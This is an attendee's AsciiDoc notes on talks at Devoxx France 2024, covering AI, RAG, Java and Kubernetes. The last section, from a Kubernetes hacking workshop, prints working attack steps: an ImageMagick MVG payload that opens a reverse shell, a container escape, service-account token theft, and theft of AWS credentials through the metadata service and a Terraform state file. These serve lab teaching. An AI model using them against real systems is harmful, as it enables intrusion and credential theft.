= Devoxx France 2024
Damien Cuenot <icon:github[] https://github.com/dcuenot/[GitHub] / icon:twitter[role="aqua"] https://twitter.com/cdams86[@cdams86]>
// Handling GitHub admonition blocks icons
ifndef::env-github[:icons: font]
ifdef::env-github[]
:status:
:outfilesuffix: .adoc
:caution-caption: :fire:
:important-caption: :exclamation:
:note-caption: :paperclip:
:tip-caption: :bulb:
:warning-caption: :warning:
endif::[]
:imagesdir: ./images
:source-highlighter: highlightjs
:highlightjs-languages: asciidoc
// We must enable experimental attribute to display Keyboard, button, and menu macros
:experimental:
// Next 2 ones are to handle line breaks in some particular elements (list, footnotes, etc.)
:lb: pass:[<br> +]
:sb: pass:[<br>]
// check https://github.com/Ardemius/personal-wiki/wiki/AsciiDoctor-tips for tips on table of content in GitHub
:toc: macro
:toclevels: 2
// To number the sections of the table of contents
//:sectnums:
// Add an anchor with hyperlink before the section title
:sectanchors:
// To turn off figure caption labels and numbers
:figure-caption!:
// Same for examples
//:example-caption!:
// To turn off ALL captions
// :caption:

[#img-header] 
.Devoxx France 2024
[link=https://cfp.devoxx.fr/2024/index.html] 
image::header.png[Devoxx France 2024,970,250]



toc::[]

== MERCREDI

=== Pr√©sentation du salon

* https://www.devoxx.fr/, du 17 au 19/04/2024
* Et c'est parti pour Devoxx France 2024, ma 5e √©dition
* Template inspir√© par https://twitter.com/thomasschwender[@thomasschwender], merci √† lui!
* Doc AsiiDoctor: https://docs.asciidoctor.org/asciidoc/latest/syntax-quick-reference/
* Les talks avec un :movie_camera: dans le titre, sont les talks o√π je recommande de regarder le replay quand il sera disponible.

=== IA en m√©decine : o√π en sommes-nous ?

==== Abstract

.Speakers : Jean-Emmanuel Bibault
----
Les techniques de machine learning sont actuellement utilis√©es pour entra√Æner de nombreux mod√®les en m√©decine. Pourquoi connaissons-nous un tel √¢ge d'or de l'IA appliqu√©e √† la m√©decine ? 
Cette pr√©sentation illustrera l'utilisation de l'IA par diff√©rents exemples publi√©s : pr√©diction du risque de d√©velopper un risque 5 ans √† l'avance, interpr√©tation automatis√©e d'image m√©dicale, d√©tection par Deep Learning de m√©lanome, pr√©diction de la survie sur simple scanner, pilotage de robots chirurgicaux, d√©pistage de la d√©pression sur instagram, chaque exemple sera expliqu√© et comment√©. Mais l'IA comporte √©galement des risques li√©s √† la gestion des donn√©es d'entra√Ænement, aux biais ou encore les attaques adversarielles. Les perspectives de d√©veloppement √† 10 √† 15 ans seront enfin abord√©es pour comprendre comment l'IA va changer la sant√© de tous.
----

==== Notes

IA en m√©decine --> anylise d'image, pose de diagnostique (ce qu'on fait d√©j√†)
T√¢ches de pr√©diction & de personnalisation (plus difficile car on ne le fait pas d√©j√† en m√©decine)

En m√©decine, dataset petits, donn√©es tr√®s peu structur√©es --> overfitting
L'effet bo√Æte noire est perturbant en m√©decine, mais visiblement √ßa s'arrange

protastecancersurvival.stanford.org

Que peut-on faire √† partir d'analyse d'image (deep learning)
D√©tection du cancer du sein, du poumon / Classification / Monitoring
cheXnet (radio thorax) --> donn√©es un peu biais√©e, car certaines reconnaissances ce sont bas√©es sur le label de l'hopital sur la radio

Analyse des fonds d'oeil / analyse de photos de grain de beaut√©
Photos insta pour d√©tecter la d√©pression
ResNet50 pour d√©tecter des risques de cancer par image satelitte..

IA g√©n√©rative
85* de bonnes r√©ponses au test US pour devenir m√©decin (mieux que le taux requis)
Commence √† avoir de meilleur diagnostic qu'un m√©decin, et il y a plus d'empathie qu'avec un m√©decin

Risques
Assez facile de feinter un syst√®me de reconnaissance d'image
Biais dans les donn√©es
D√©but de possibilit√©s pour "lire dans les pens√©es", capacit√© de reproduire une image √† partir d'activit√© c√©r√©brale


=== Hands-on Gemini, the Google DeepMind LLM

==== Abstract

.Speakers : Mete Atamel & Valentin Deleplace & Guillaume Laforge
----
In this hands-on workshop, you will get to code using Gemini, the new Large Language Model from Google DeepMind. You will first start by familiarizing yourself with the model's capabilities. Then you will use Gemini in different concrete cases, such as extracting data from unstructured text, document classification, but also searching your own documents, or how to supplement the model by integrating the call to external APIs.
The workshop will be conducted using the Java language and the LangChain4j library. Come equipped with a laptop. We will code together in the cloud, no need for any special installation on your machine.
----

==== Notes
AI > Machine Learning > Deep Learning > Generative > Image Gen / LLMs (transformers)
https://s10251.pcdn.co/wp-content/uploads/2024/03/2024-Alan-D-Thompson-AI-Bubbles-Planets-Rev-6.png

Gemma is the open source of Gemini

Workshop based on Vertex AI, and what will do is not fully compatible with Google AI Studio


LangChain4j
Great abstraction and high level
There is a java SDK, but for the workshop we will use LangChain4j

Link to the lab: http://bit.ly/gemini-devoxx-2024


Gemini can speak French, but when I changed the temperature to 1, its creativity disappeard :(
....
Je suis d√©sol√©, mais je ne peux pas vous r√©pondre en fran√ßais car je ne suis pas encore configur√© pour cela. 
Je suis toujours en d√©veloppement et j'apprends de nouvelles choses chaque jour. 
Pour l'instant, je ne peux que r√©pondre en anglais.
....

Gemini is multimodal and can describe images. I did a test with [this one](https://www.devoxx.fr/wp-content/uploads/2023/11/21-1200x630-Facebook-Feed-Image2.png)
....
 The picture shows a robot running in a stadium with a crowd of people watching. 
 The robot is wearing a black and gold suit and has a green light on its chest. 
 The stadium is lit up by bright lights. 
 The picture is taken from a low angle, making the robot look larger than life.
....

Retrieval Augmented Generation (RAG)
_I'm finaly starting what my team is doing.. _

image::indexing_querying.png[Ingestion and Querying]



Function calling
https://github.com/glaforge/gemini-workshop-for-java-developers/blob/main/app/src/main/java/gemini/workshop/MultiFunctionCalling.java


=== Je me suis fait voler la carte de cr√©dit de ma banque en ligne et mon t√©l√©phone portable... C'est grave docteur ?

==== Abstract

.Speakers : Patrick Merlin
----
Retour sur un incident de s√©curit√© incluant vol de t√©l√©phone.
Le t√©l√©phone permet de valider toutes les transactions.
Nous verrons ce qu'il ne faut surtout pas faire pour √©viter les p√©pins !
----

==== Notes

Les retraits DAB ont √©t√© rembours√©s
Les virements faits avec la double d'authentification n'ont pas √©t√© rembours√©
Si l'op√©rateur bloque la ligne, les SMS sont toujours distribu√©s

Les codes MFA de secours, √ßa d√©panne toujours

=== Du Clic √† la Conversation : rempla√ßons boutons et formulaires par un LLM !

==== Abstract

.Speakers : Marie-Alice Blete
----
Pr√©parez-vous √† voyager dans le domaine de l'interaction homme/machine. Vous connaissez la premi√®re r√©volution : la souris et l'interface graphique ? Nous sommes d√©sormais √† l'√®re de la deuxi√®me r√©volution : l'interaction en langage naturel gr√¢ce a l'intelligence artificielle.
Dans cette pr√©sentation, nous allons metamorphoser une application standard en une application bas√©e sur un LLM. Dites adieu aux boutons et formulaires car nous nous appr√™tons √† r√©√©crire les r√®gles de l'interface utilisateur !
Nous d√©buterons par les bases, avec un bref rappel des principes de LLM, suivi d'une premi√®re solution exploitant l'API OpenAI. Ensuite, nous verrons deux autres solutions plus avanc√©es, dont une comprenant l'utilisation d'agents avec le framework LangChain.
√Ä la fin de cette pr√©sentation, vous disposerez de toutes les connaissances n√©cessaires pour vous lancer. Vous aurez √©galement une liste d'astuces, de conseils, ainsi qu'une bonne compr√©hension des √©cueils pour int√©grer des LLM dans vos developpements. Passons du clic √† la conversation !
----

==== Notes

https://github.com/malywut/clicks2conversations
https://www.microsoft.com/en-us/research/publication/guidelines-for-human-ai-interaction/


=== Nous sommes tous rassembl√©s - We are all to gather

==== Abstract

.Speakers : R√©mi Forax
----
Java 22 est sorti avec en preview une nouvelle API pour cr√©er soi-m√™me ses propres op√©rations sur les Streams, un peu comme l'API des collecteurs mais pour les transformations interm√©diaires effectu√©es par un stream.
Je vous propose d'en profiter pour faire un petit retour sur les concepts derri√®re un Stream, comment cela fonctionne en interne, comment les op√©rations (parallel/stateful/short-circuit) sont d√©finies. Puis de sauter dans le grand bain et d√©couvrir la nouvelle m√©thode gather() et l'API des Gatherers et ce que l'on peut faire avec. Enfin, nous verrons les limitations et les am√©liorations possibles de cette nouvelle API.
----

==== Notes
Stream ?
Spliterator > Filter (Interdemediate op) > FlatMap > toList (Terminal op)
Spliterator push les donn√©es (√† la diff√©rence d'un Iterator qui pull)

A Gather
Objectif impl√©menter n'importe quelle op√©ration intermediaire
stream.gather(Gatherers.fold(..)).toList()

Modelisation
....
Gatherer<String, ?, String> filter() {
    return Gatherer.of((_, element, downstream) -> {
        if(elemeent.endsWith("1")){
            return downstream.push(element);
        }
        return true;
    })
}
....

Parallel or Sequential
Stateless or Stateful
Short-circuit (peut s'arr√™ter en cours, ex: limit) vs Greedy (ne peut pas s'arr√™ter)

jmh pour tester les perfs
Pour l'instant gather est plus lent que les map / mapToInt natif, car ces derniers contiennent des optimisations

API en preview dans java 23



=== :movie_camera: Crafting your own RAG system: Leveraging 30+ LLMs for enhanced performance

==== Abstract

.Speakers : Stephan Janssen
----
In this talk you'll learn how to set up a RAG (Retrieval-Augmented Generation) system against 30+ different Large Language Models using Java.
We'll show you step-by-step how to ingest documents, choose the best text splitter strategies, find similar documents, answer questions, and create a chatbot.
Then, we'll see how to test and compare different AI models, both from open sources and private ones, and whether they are stored on your own computer or accessed online.
You'll walk away knowing how to setup a well balanced RAG system using Java and the best performing and/or cheapest LLM.
----

==== Notes

Embedding --> convert a text to vector
QueryTransformer generate Sub-questions
Agents (or Tools)  can answer directly with data on DB / websites

ReRanker supported: Cohere (cost) + (free one: https://github.com/stephanj/BM25 (troll ;)) )

image::stephan007.jpg[Querying]

*How do we correctly split text?*
To split or not to split? That's the question

window context of 4K to 200K tokens... to 1M tokens
120$ for 1M tokens per query
Response time

Greg Kamradt (youtube) explains how to split
https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.youtube.com/watch%3Fv%3D8OJC21T2SL4&ved=2ahUKEwjDuPSstMmFAxXETKQEHWgYBAMQwqsBegQICxAG&usg=AOvVaw0M6zfJI40tTM5-FIAnltcz

*Vector store*
pgVector / Milvius / Elastic...
Alexander Chatzizacharias
https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.youtube.com/watch%3Fv%3DW-i8bcxkXok&ved=2ahUKEwjokcq9tcmFAxVuUKQEHbkaDr4QtwJ6BAgREAI&usg=AOvVaw27WlIgOmfG3jRGrqY2XIoz

https://github.com/weaviate/weaviate
https://www.anthropic.com/news/claude-3-family

*Embedding*
OpenAI / Nomic / HuggingFace / Cohere v3 (multi language)
All MiniLM L6 V2 / E5 Small V2
https://github.com/stephanj/langchain4j-cohere

/!\ Max input limit

*Evaluate your RAG*
https://github.com/stephanj/rag-genie


== JEUDI

=== Programming's Greatest Mistakes

==== Abstract

.Speakers : Mark Rendle
----
Most of the time when we make mistakes in our code, a message gets displayed wrong or an invoice doesn't get sent. But sometimes when people make mistakes in code, things literally explode, or bankrupt companies, or make web development a living hell for millions of programmers for years to come.
 
Join Mark on a tour through some of the worst mistakes in the history of programming. Learn what went wrong, why it went wrong, how much it cost, and how things can be pretty funny when they're not happening to you.
----

==== Notes

$500,000,000,000 due to Y2K bug, mainly in Mainframe
Y2K22 22220101 can't be parsed as a Long

Pentium FPU (Floating Point Unit)

Null (billion dollars mistake)
issue introduced in Algol W (first language with null)

Bugs in space
In space noone can set a breakpoint

Mars Climtae Orbiter
Orbiter failed due to conversion issue between imperial & metric systems

Ariane 5
Copy paste code btw Ariane 4 & 5, but they changed the processor (moved to 64 bits processor)

Don't trust computer :)


=== Un monde shoot√© aux m√©taux

==== Abstract

.Speakers : Agnes Crepet & Guillaume Pitron
------
Dans cette conf√©rence intitul√©e "Un monde shoot√© aux m√©taux", Guillaume Pitron, expert des enjeux g√©opolitiques li√©s aux ressources naturelles, et Agnes Crepet, sp√©cialiste en technologies √©co-responsables, s'unissent pour aborder la d√©pendance croissante de nos soci√©t√©s aux m√©taux rares et ses implications profondes. Ils exploreront comment cette consommation excessive impacte l'environnement, l'√©conomie mondiale et les relations sociales, en d√©voilant les cha√Ænes d'approvisionnement complexes qui relient les mines isol√©es aux technologies quotidiennes. La discussion soulignera les cons√©quences environnementales de l'extraction des m√©taux, les d√©fis √©thiques et les tensions g√©opolitiques qu'elle engendre.
------

==== Notes



=== Comprendre l'IA: construisez votre propre ChatGPT d'entreprise avec LangChain4J

==== Abstract

.Speakers : Yohan Lasorsa & Julien Dubois & Sandra Ahlgrimm
------
Les technologies d'IA, et particuli√®rement les grand mod√®les de langages (LLM) poussent un peu partout comme des champignons ces derniers temps. Comment ces mod√®les fonctionnent-ils, et comment s'en servir dans vos applications?
Dans ce workshop, nous allons construire de z√©ro un chatbot bas√© sur GPT-4 impl√©mentant le pattern Retrieval Augmented Generation (RAG). En utilisant une base de documents de r√©f√©rence, le mod√®le sera capable de r√©pondre √† des questions en langage naturel, et de g√©n√©rer des r√©ponses compl√®tes et sourc√©es dans vos documents. Pour cela, nous allons cr√©er un service SpringBoot qui s'appuiera sur le framework open-source LangChain4J, ainsi qu'un site web pour tester notre chatbot. Enfin, nous d√©ploierons le tout sur Azure.
   
Au programme:  
- Introduction aux mod√®les de langage: fonctionnement et limites
- Cr√©ation d'une base de connaissances: embeddings, BDD vectorielle et recherche par similarit√©  
- Utilisation de LangChain4J pour impl√©menter le pattern RAG (Retrieval Augmented Generation)
- Introduction au prompt engineering pour am√©liorer les performances
- Cr√©ation d'une API SpringBoot pour interagir avec le mod√®le
- Cr√©ation d'un site web pour tester le chatbot
- D√©ploiement de l'API dockeris√©e et du site web sur Azure
   
A l'issue du workshop, vous aurez une compr√©hension plus claire des LLMs ainsi que des id√©es pour les utiliser. Vous saurez comment cr√©er une base de connaissances et un chatbot fonctionnels, et les d√©ployer dans le cloud.
------

==== Notes

----> Salle comble :( , donc plan B 
https://aka.ms/ws/openai-rag-quarkus


=== GatewayAPI, 10 ans de maturation pour une nouvelle API Kubernetes

==== Abstract

.Speakers : Kevin Davin
------
Exposer une application Kubernetes au monde peut devenir un vrai casse t√™te üßê.  
Nous avons d'un c√¥t√© les API standards avec Ingress, service de `type=LoadBalancer`, voir m√™me les NodePorts‚Ä¶ et de l'autre, les APIs custom propos√©es par les Ingress Controllers et Service-Meshes tr√®s avanc√©es mais non standard üòÖ
Apr√®s tant d'ann√©es de confusion, une nouvelle API, nomm√©e Gateway API, arrive tout juste en v1.0 (üéâ) pour contenter √† la fois les d√©veloppeurs et les op√©rateurs de cluster ou d'infrastructure ü§Ø!
Nous d√©couvrirons ensemble cette nouvelle API, ses fonctionnalit√©s avanc√©es et les impl√©mentations qui vous permettrons de les utiliser dans votre cluster ‚ö°Ô∏è!
------

==== Notes

Dans Kube il manque des choses, mais il est possible d'en ajouter
NodePort 
>> LoadBalancer 
>> kind: Ingress (fait disparaitre la notion node) pointe vers le service qui pointe vers les nodes
http only, configuration par annotations dans le .yaml, niveau certificat il doit connu par le domain, d√©ploiement complexe
>> Ingress-Controlers (CRD custom): contour
>> Api gateway (CRD custom): Kong, traefik

>> GatewayAPI project
Spec, et pas d'impl√©mentation
4 concepts cl√©s:
* Role Oriented (Infra, cluster operator, Dev)
* Portabilit√© 
* Extensible (update d√©corel√© du cluster k8s)
* Expressif (HTTProute, GRPCRoute, UDPRoute)

image::k8s.jpg[Gateway]

GatewayClass (G√©rer par les personnes de l'infra)

HTTPRoute (G√©rer par les dev)

Routage possible multi namespaces
Nouvel object: ReferenceGrant 
ReferenceGrant identifies kinds of resources in other namespaces that are trusted to reference the specified kinds of resources in the same namespace as the policy.

Possible de faire du routing sur du path, des headers HTTP, des query param, RequestMirroring (les appels v2 sont en fire & forget)

Comment on d√©marre avec la Gateway API
Gateway API: https://gateway-api.sigs.k8s.io/implementations/


=== La recherche √† l'√®re de l'IA

==== Abstract

.Speakers : David Pilato
------
La recherche ne se contente plus de l'approche maintenant traditionnelle bas√©e sur la fr√©quence des termes (TF/IDF ou BM25) mais plus sur la tendance actuelle du machine learning o√π les nouveaux mod√®les ont ouvert une nouvelle dimension pour la recherche.
Cette conf√©rence donne un aper√ßu de :
La recherche "Classique" et ses limitations
Qu'est qu'un mod√®le de machine learning et comment vous pouvez l'utiliser
Comment utiliser la recherche vectorielle ou la recherche hybride dans Elasticsearch
Comment ChatGPT d'OpenAI ou les "large language models" (LLMs) similaires viennent jouer naturellement avec Elastic
Cette session couvre l'√©tat de l'art en mati√®re de recherche de nos jours : BM25, recherche vectorielle, embeddings, recherche hybride, Reciprocal Rank Fusion, int√©gration avec OpenAI... La d√©mo principale montre comment g√©n√©rer des embeddings √† partir de musiques puis comment trouver la musique qui s'approche le plus d'une musique que nous fredonnons.
------

==== Notes

C'est quoi un vecteur?
Elements repr√©sent√©s dans un espace d'embeddings

image::similar_vectors.jpg[Similar Vectors]

Comment on passe des entr√©es √† des vecteurs?
Utilis√© des mod√®les sur √©tag√®re (reco) sinon cr√©er son mod√®le mais attention au use-case

Source data -> pytorch -> post des embeddings dans Elastic (mode free)
Source data -> Elastic ML (inf√©rence faite √† l'insertion) -> post des embeddings dans Elastic (mode payant)
https://ela.st/nlp-supported-models

Query --> m√™me mod√®le qu'√† l'indexation --> g√©n√®re le query vector

Search - query - KNN
Index - mapping - dense_vector

1 + cos(theta) / 2 --> m√©thode par d√©faut de calcul de distance
sinon distance euclidienne

HNSW Hierarchical Navigable Small Worlds
----> am√©liore les perfs

4096 dimensions support√©s par Elastic --> mais ca coute cher en IO disk, m√©moire (mais c'est hors heap java)
Eviter de faire des recherches pendant les indexations (utilis√© des aliases)
Exclure les vecteurs du champs _source (useless pour les users)
Reduire les dimensions
Utiliser des octets au lieu des floats

hybride search
Recherche sur les termes + recherche vectorielle
Une query avec le match (classique) + la recherche knn avec les vecteurs
^ dense vector

ELSER 
sparse_embedding genere des "synonymes" pond√©r√©

RRF (Reciprocal Rank Fusion) - Ranking
On tient compte du rang dans les r√©sultats (on ajoute 60 + rang), et on somme les rangs obtenus par chaque algo

exclude audio_embedding from _source


Demo RAG: Elastic + Cohere
Donn√©es du wiki Elastic index√©es
Possibilit√© de faire de la s√©curit√© niveau document (Document level security)

Lien vers la pr√©sentation: https://speaker.pilato.fr/WlpZdt

=== Debugguez votre salaire ! Mes strat√©gies gagnantes pour r√©ussir sa n√©gociation salariale

==== Abstract

.Speakers : Shirley ALMOSNI CHICHE
------
D√©cortiquer les myst√®res du salaire, un terrain min√© o√π se m√™lent d√©bats enflamm√©s, pr√©jug√©s persistants et fantasmes insaisissables‚Ä¶

Parfois, tel un mauvais date, vous avez du mal √† aller jusqu'au bout d'une proposition convenable √† cause de multiples arguments comme ¬´ on n'a pas le budget ¬ª, ¬´ on doit respecter la grille salariale ¬ª ou encore ¬´ vous n'avez pas √©t√© assez convainquant techniquement ¬ª. J'exposerai donc les points critiques qui vous font souvent obstacle. 

√âvidemment √ßa vous frustre et vous n'√™tes pas Jean Claude Dusse : tout ne se joue pas sur un malentendu. Ainsi je vous donnerai les coulisses de la r√©flexion salariale et les quelques contre-arguments √† formuler pour gagner la partie. Tout cela saupoudr√© de mon analyse du profil des employeurs/interlocuteurs. Je vous parlerai donc des utilisateurs de vos comp√©tences et de leurs freins r√©els et psychologiques. C'est mon petit c√¥t√© agile.

Enfin, telle une v√©t√©rante du recrutement, je vous d√©voilerai une multitude de conseils pratiques pour ma√Ætriser l'art de la n√©gociation salariale. Pour cela, je mettrai en lumi√®re l'importance cruciale de la pr√©paration et de l'anticipation dans cette jungle du recrutement bien avant que la question du salaire ne soit pos√©e sur la table. 

Fini le myst√®re, place √† la strat√©gie gagnante ! üòò
------

==== Notes

Bugs observ√©s
1. Respect de la grille salariale
2. Traitement √©quitable (le nouveau va avoir plus que le Tech Lead qui est l√† depuis 3 ans)
3. D√©sol√© les finances sont compliqu√©es
4. D√©sol√© tu n'as pas le niveau technique
5. Plaisir de n√©gocier
6. Discrimination salariale

Correction de bugs
1. Bien se renseigner sur le package. Rentrer dans le champ lexical de l'interlocuteur
2. Montrer qu'on est pr√™t √† aller au dela du role d√©crit. Revalorisation fin p√©riode d'essai (√† mettre dans le contrat de travail)
3. BSPCE, co√ªts du chasseur de t√™te, polyvalence
4. Demand√© le feedback de l'entretien technique, essayer d'avoir une formation pour arriver au niveau, montrer que l'entretien technique n'a pas mis en valeur mes comp√©tences
5. Pointer les failles / vices dans le projet vis√©, poser des limites
6. go / nogo, pas simple de savoir quoi faire quand on y fait face.

Miroir, empathie tactique
Fore tranquille: √©couter, penser √† l'autre

Tips
* Le choix du poste (zone de confort ou alors on s'√©loigne ? Secteur qui paie bien ? Poste courtis√© ? Localisation ? Equilibre entre offre et demande)
* L'observation (annonce de recrutement, le march√©, sant√© financi√®re, staff & background) - chooseyourboss seyos denis germain levels.fyi
* Face √† face RH (apport de la valeur, faits concrets, poser des questions sur le poste)
* Salaire souhait√© (m√©thode Ackerman, chiffre sp√©cifique, donner la marge de flexibilit√©)
* Rencontre technique (attente priorit√© pour le poste, quel est format de l'√©valuation ? Points de souffrance dans leur quotidien, feedback post-entretien, partage des critiques)
* Equipe (la rencontrer, identifier les personnes influentes)
* Proposition d'embauche (temps de r√©flexion +/- 48 heures, rester coh√©rent, contre-offre argument√©e sur des faits + bon timing
)




== VENDREDI

=== Comment mod√©liser l'√©tat du monde en 2100 ? Le Rapport Meadows

==== Abstract

.Speakers : Anatole Chouard
----
Comment mod√©liser l'√©tat du monde en 2100 ? Pas la question la plus simple ! Mais en 1972 un groupe de chercheurs du MIT a essay√© de r√©pondre √† cette question : c'est le fameux et fascinant rapport Meadows. Et ils ont compris bien des choses avant tout le monde. Dans cette conf√©rence interactive, je vous fais un r√©sum√© en 20 minutes de la m√©thode et surtout des r√©sultats du rapport Meadows !
----

==== Notes

Rapport Meadows

Identifier les syst√®mes majeur
Alimentaire / industriel / population / pollution / ressources (renouvelable - non-renouv)

Interaction entre syst√®mes

Quantifier les interactions

Courbes des √©volutions (l'important c'est la forme des courbes, pas les valeurs)

=== Cybers√©curit√© et cyberd√©fense : un sujet g√©opolitique

==== Abstract

.Speakers : Guillaume Poupard
----
La cybers√©curit√© est souvent vue, √† juste titre, sous un angle technique, op√©rationnel et r√©glementaire. L'incroyable √©volution de la menace informatique nous concerne tous, √† titre individuel, au niveau des organisations mais √©galement √† l'√©chelle des Etats. Dans un contexte g√©n√©ral de fortes tensions g√©opolitiques, le cyber est devenu un ingr√©dient majeur dont l'usage se syst√©matise dans des conflits qualifi√©s ¬´ d'hybrides ¬ª. Passionnante et effrayante, cette militarisation de l'espace num√©rique nous concerne toutes et tous !
----

==== Notes

80% du temps pass√© √† l'ANSII, c'est pas sur la cybersec mais l'espionnage
Bureaux des l√©gendes une bonne r√©f√©rence
Espionnage le vrai plus vieux m√©tier du monde :)

Attaquants tr√®s discrets
Victimes ne s'en rendent pas compte (√ßa prend des mois voire des ann√©es pour le d√©couvrir)

Cyber devenu un sujet g√©opolique
Possibilit√© de paraliser des syst√®mes / √©tats entier

Livre blanc 2008
https://fr.wikipedia.org/wiki/Livre_blanc_sur_la_d√©fense_et_la_s√©curit√©_nationale_2008#:~:text=Le%20Livre%20blanc%20sur%20la,France%20de%202009%20√†%202020.

En France, on a un probl√®me, donc on en fait une loi
Les OIV doivent se prot√©ger des attaques cyber
12 secteurs dans les OIV
* √ânergie
* Transports
* Eau
* Sant√©
* T√©l√©communications
* D√©fense
* Finances
* Alimentation
* Technologies de l'information et de la communication
* Recherche
* Industrie chimique
* Espace

Cyber attaque TV5 Monde 2015
Attribuer une attaque √† qqun c'est qqch de tr√®s difficile
Source au final --> l'Est

2017 - Wannacry
GB le service de sant√© s'est bloqu√©

Notpetya
Efface les donn√©es, donc pas vraiment un ranc√ßngiel
Visait princiapelement l'Ukraine
Saint Gobbin impacter par Notpetya, usine en Ukraine op√©rait une usine l√†-bas (bien que vendu 2 ans auparavant)
Ukraine toujours attaqu√© par l'Est maintenant, mais a su mieux se prot√©ger


=== Si j'√©tais un hacker, comment est-ce que je prendrais le contr√¥le de votre cluster Kubernetes

==== Abstract

.Speakers : Thibault Lengagne & Alexandre Herv√©
----
Un cluster Kubernetes est un orchestrateur de conteneurs qui permet de d√©ployer et de g√©rer des applications de mani√®re efficace. Cependant, en raison de sa complexit√©, un tel cluster peut facilement √™tre vuln√©rable aux attaques et sa s√©curit√© peut √™tre compromise. Pour √©viter cela, la meilleure option reste de tester ses d√©fenses en se mettant dans la peau d'un attaquant !
Devenez vous-m√™me un hacker pour la dur√©e de cet atelier. Vous allez r√©aliser les diff√©rentes √©tapes de compromission un cluster Kubernetes et du compte AWS sous-jacent. Nous aborderons diff√©rentes techniques d'attaques en commen√ßant par l'ex√©cution de commandes sur un pod puis, gr√¢ce √† diff√©rentes √©l√©vations de privil√®ge, la compromission totale du cluster. Nous mettrons √©galement en place des mesures pr√©ventives dans le but d'emp√™cher ces diff√©rentes failles de s√©curit√© d'√™tre exploit√©es.
----

==== Notes

https://www.microsoft.com/en-us/security/blog//wp-content/uploads/2020/04/k8s-matrix.png


Ecoute sur l'attaque box
....
nc -lvnp 50986
....

Cr√©er une image avec l'exploit
....
$ cat exploit.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|setsid /bin/bash -i >/dev/tcp/10.100.1.188/50986 0<&1 2>&1 &")'
pop graphic-context
....

Dans le shell interactif
....
python -c 'import pty; pty.spawn("/bin/bash")'
Press Ctrl+Z
$ stty raw -echo
Press fg and then Enter
....

Une fois connect√© dans le pod:
Lister les process
....
ps aux
....

Lister les capacit√©s du container
....
capsh --print
....

Pour sortir du container et aller sur node:
....
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
....

Lister les containers ou les points de montage
....
ctr -n k8s.io c list
mount | grep kube
....

....
#!/bin/bash

# Download kubectl
cd /tmp/
curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl
chmod +x ./kubectl
mv ./kubectl /bin
alias kubectl="kubectl  --server=https://$KUBERNETES_SERVICE_HOST --token=$TOKEN --insecure-skip-tls-verify=true"

# Tries all the token found to access kube-api
# Tries to get the secrets using each token

# for path in $(mount | grep kube-api | awk '{print $3}'); do
#   TOKEN=$(cat $path/token);
#   echo "==================================="
#   echo $TOKEN;
#   echo "Service account : $(python /tmp/decode_jwt_token.py $path/token | jq -r '.sub')"
#   echo "-----------------------------------"
#   kubectl get secrets -A;
#   echo "==================================="
# done

# Look for admin token
ctr -n k8s.io container list
PID=$(ctr -n k8s.io container list | grep nginx | awk '{print $1}')
crictl exec -it $PID /bin/sh

# Get token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Two tokens should work the ingress controller service account and the busybox service account
export TOKEN=<...>

# You can list but not read
kubectl get secrets -n kube-system --token=$TOKEN

# Tips add -o yaml pour avoir la sortie
....


Attack AWS
....
#!/bin/bash

#
# On the node shell
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`

# Explore API
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/

# Get name of the role
node_group=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# Get the role
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/$node_group -o creds.json

# Export the body of your response in a json file and save it on your local machine
# Use the python script to obtain the format of the aws credentials
python /tmp/export-credentials-aws.py creds.json

# Get cluster name and API Endpoint
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/user-data


# # Install AWS
# curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
# python -c "import zipfile; zip_ref=zipfile.ZipFile('awscliv2.zip', 'r');zip_ref.extractall('/tmp/')"
# chmod +x ./aws/install
# ./aws/install
# chmod +x /usr/local/bin/aws
# export AWS_PAGER=""

# GO to your machin

# List bucket
aws s3api list-buckets
aws s3 cp s3://devoxx-eks-attack-terraform-backend/poc /tmp/state.json

cat /tmp/state.json| jq '.resources[].name'  | grep admin
cat /tmp/state.json| jq '.resources[] | select (.name == "admin_user_access_key")'



unset AWS_SECRET_ACCESS_KEY
unset AWS_ACCESS_KEY_ID
unset AWS_SESSION_TOKEN
export AWS_ACCESS_KEY_ID=$(cat /tmp/state.json| jq '.resources[] | select (.name == "admin_user_access_key")' | jq -r '.instances[].attributes.id')
export AWS_SECRET_ACCESS_KEY=$(cat /tmp/state.json| jq '.resources[] | select (.name == "admin_user_access_key")' | jq -r '.instances[].attributes.secret')

aws iam list-users

# Delete the key to prevent exploitation
aws iam delete-access-key --access-key-id "<key>" --user-name admin-test
....


Pour se d√©fendre --> Falco
https://falco.org

imds v2 pour √©viter plusieurs risques de s√©cu: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html

Pas de containers privilig√©s melang√©s avec des containers non priviligi√©s
Les mettre sur des nodes d√©di√©s

